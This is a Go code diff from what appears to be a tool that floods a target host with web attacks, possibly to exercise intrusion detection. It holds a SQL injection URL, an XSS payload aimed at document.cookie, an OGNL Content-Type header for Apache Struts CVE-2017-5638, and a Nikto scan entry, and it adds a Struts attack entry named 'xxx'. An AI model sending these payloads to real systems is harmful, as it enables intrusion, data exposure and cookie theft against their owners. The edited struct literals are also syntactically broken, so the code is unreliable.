@@ -119,9 +119,12 @@ func (p *program) Start(s service.Service) error {
 		minRequests: 800, url: fmt.Sprintf("http://%s/?user_id=%s", target, "1029292%20OR%2019%3D19%20--%20-")}
 	xssBlast = Attack{name: "XSS Blast", method: "GET", maxNap: 7000, minNap: 1, maxRequests: 1200, pause: 1,
 		minRequests: 100, url: fmt.Sprintf("http://%s/forum/memberlist.php?account=%s", target, "%5C%22%3E%5C%22%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E")}
-	cve20175638 = Attack{name: "cve20175638", method: "GET", maxNap: 600, minNap: 1,
+	cve20175638 = Attack{name: "cve20175638", method: "GET", maxNap: 0, minNap: 0, pause: 1,
+		maxRequests: 1800, minRequests: 2, url: fmt.Sprintf("http://%s/", target)}
+	        headers: map[string]string{"Content-Type": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?)multipart/form-data"}}
+	xxx = Attack{name: "xxx", method: "GET", maxNap: 600, minNap: 1,
 		url:     fmt.Sprintf("http://%s/", target),
-			     headers: map[string]string{"Content-Type": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?)multipart/form-data"}}
+		headers: map[string]string{"Content-Type": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?)multipart/form-data"}}
 
 	/* Attack Tools */
 	niktoBlast = Tool{name: "Nikto Blast", location: "nikto/program/nikto.pl", host: target}
@@ -236,7 +239,7 @@ func (attack *Attack) send() {
 		attack.link(5, req)
 	
 	} else if attack.name == "cve20175638" {
-		attack.link(5, req)
+		attack.force(req)
 
 	} else if attack.name == "Open Redirect" {
 		attack.redirect(req)
